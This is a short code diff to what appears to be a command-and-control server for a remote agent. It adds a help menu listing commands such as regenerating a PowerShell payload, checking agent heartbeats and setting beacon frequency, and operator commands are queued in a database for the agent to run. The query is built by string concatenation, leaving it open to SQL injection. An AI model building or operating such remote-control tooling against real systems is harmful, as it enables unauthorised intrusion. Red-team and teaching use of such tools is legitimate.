@@ -65,6 +65,19 @@ agent_has_connected = False
 
 #############################################################################
 
+def print_help():
+    print(
+        '''
+        \r  Command         Description
+        \r  help            print this message
+        \r  generate        regenerate the powershell payload and print it to console
+        \r  pulse           check when the agent last checked in
+        \r  set-frequency   set the time between requests from the agent
+        \r  exit-agent      stop the connected agent
+        \r  exit            exit this program
+        '''
+    )
+
 def new_command(cmd):
     if get_last_result()[3] == 1:
         cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES ('" + cmd + "', null, 0)")
@@ -132,12 +145,15 @@ try:
 
         if command == "exit":
             raise SystemExit
+        if command == "help":
+            print_help()
+            continue
         if command == "":
             continue
         if command in ["cd ..", "cd .", "cd"]:
             logger.failed("you cannot use dots in the command")
             continue
-        if command in ["pulse", "heartbeat", "beat"]:
+        if command in ["pulse"]:
             logger.info(f"Agent last checked in at {get_heartbeat()}")
             continue
 
